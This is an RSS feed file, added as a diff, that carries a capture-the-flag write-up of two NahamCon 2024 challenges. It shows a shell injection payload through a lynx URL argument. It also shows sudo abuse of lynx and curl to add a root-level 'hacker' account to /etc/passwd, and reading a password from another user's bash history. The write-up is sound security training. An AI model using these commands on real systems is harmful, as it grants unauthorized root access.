@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Lynx on</title><link>https://blog.ikuamike.io/tags/lynx/</link><description>Recent content in Lynx on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 25 May 2024 21:17:45 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/lynx/index.xml" rel="self" type="application/rss+xml"/><item><title>NahamCon CTF 2024 WriteUp - Miscellaneous</title><link>https://blog.ikuamike.io/posts/2024/nahamcon_ctf_2024_misc/</link><pubDate>Sat, 25 May 2024 21:17:45 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/nahamcon_ctf_2024_misc/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/logo.jpeg" class="center" style="border-radius: 8px;" />
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>NahamCon 2024 is taking place this weekend and they had a CTF as part of the online conference. I participated with team &lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">fr334aks&lt;/a>
+.&lt;/p>
+&lt;p>We managed position 197. We did good on Web, Mobile and WarmUps but not well on other categories like Binary Exploitation and Crypto.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/cert.png" class="center" style="border-radius: 8px;" />
+&lt;p>It was our first CTF of the year together, so it&amp;rsquo;s not a bad start from a long break. Hopefully we get back to our winning ways :).&lt;/p>
+&lt;p>I only solved 2 Miscellaneous challenges that I am writing about in this post.&lt;/p>
+&lt;h2 id="1-securesurfer">1. SecureSurfer&lt;/h2>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_1.png" class="center" style="border-radius: 8px;" />
+&lt;p>We begin with ssh access to the challenge environment, we are also provided with &lt;a href="https://blog.ikuamike.io/files/nahamcon_ctf_2024/securesurfer.c">securesurfer.c&lt;/a>
+file. Our objective is to gain root access to get the flag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_2.png" class="center" style="border-radius: 8px;" />
+&lt;p>When we ssh, it seems the securesurfer program is executed and we are provided with a few options.&lt;/p>
+&lt;p>If we look at the code provided, the only option that takes user input is option 6 which is a url that will be loaded using lynx browser on the terminal.&lt;/p>
+&lt;p>We can see that the user input is not sanitized/validated, the only check done is that the url has to begin with &lt;code>https://&lt;/code>.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_4.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can therefore inject our own commands to break out of the program and into a shell. After the url we can inject the below payload.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;;bash;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once lynx program is done loading the url, we get a bash shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_3.png" class="center" style="border-radius: 8px;" />
+&lt;p>To escalate our privileges, we find that the securesurfer user can run lynx as root.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_5.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can then try accessing the root folder using the below command.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/local/bin/lynx file:///root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_6.png" class="center" style="border-radius: 8px;" />
+&lt;p>Here we see the get flag binary, we can then download it to our local directory and execute it to get the flag.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/local/bin/lynx -source file:///root/get_flag_random_suffix_21505252448959 &amp;gt; get_flag
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_7.png" class="center" style="border-radius: 8px;" />
+&lt;p>If we wanted to get a root shell, one way is to overwrite the passwd file to add a user with root privileges.&lt;/p>
+&lt;p>We&amp;rsquo;ll begin by creating a password hash for the user we want to add to the passwd file, the password here is &lt;strong>hacker&lt;/strong>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>openssl passwd -1 -salt hacker hacker
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we&amp;rsquo;ll copy the current passwd file to our directory and add our new user to the file, using the below format where we specify the user with id 0 to give root privileges. The username is &lt;strong>hacker&lt;/strong>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#39;hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_8.png" class="center" style="border-radius: 8px;" />
+&lt;p>Then we&amp;rsquo;ll launch lynx and overwrite the /etc/passwd with our modified passwd file.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/local/bin/lynx file:///home/securesurfer/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we are in lynx, we will press &lt;strong>P&lt;/strong> which is the print option, and we select &lt;strong>Save to a local file&lt;/strong> and press enter.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_9.png" class="center" style="border-radius: 8px;" />
+&lt;p>We can then update the filename to /etc/passwd.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_10.png" class="center" style="border-radius: 8px;" />
+&lt;p>Once we say yes to Overwrite the file, we can quit lynx and switch to the &lt;code>hacker&lt;/code> user, using the password &lt;code>hacker&lt;/code> to get a root shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/secure_surfer_11.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="2-curly-fries">2. Curly Fries&lt;/h2>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_1.png" class="center" style="border-radius: 8px;" />
+&lt;p>For this challenge, we begin by ssh into the challenge environment. Our objective is to escalate to root and get the flag.&lt;/p>
+&lt;p>Our user has sudo privileges to run curl impersonating the user fry, however this configuration is not vulnerable to abuse.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_2.png" class="center" style="border-radius: 8px;" />
+&lt;p>Looking around, we find that in fry&amp;rsquo;s home folder we can read the bash_history file. This gives us their password.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_3.png" class="center" style="border-radius: 8px;" />
+&lt;p>Switching to the user fry, we see they can run curl as root but the configuration includes a wildcard. This is different from the previous configuration and we can abuse it.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_4.png" class="center" style="border-radius: 8px;" />
+&lt;p>Similar to the previous challenge, we&amp;rsquo;ll use curl to overwrite the passwd file with a modified version that has the hacker user with root privileges.&lt;/p>
+&lt;p>I set up a python web server to serve the modified passwd file and then downloaded it and perform the overwrite.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo /usr/bin/curl 127.0.0.1:8000/health-check -o /etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/curly_fries_5.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>Thanks to John Hammond, NahamSec and the rest of challenge creators for putting together yet another great CTF this year. I didn&amp;rsquo;t put in a lot of time to solve more challenges but I still had a good time.&lt;/p>
+&lt;p>You can catch the conference live here: &lt;a href="https://www.youtube.com/live/76mNNVVBht0?si=E2TKu8fJD6SNXFCR" target="_blank" rel="noopener">NahamCon CTF 2024 Live Stream&lt;/a>
+&lt;/p></content></item></channel></rss>
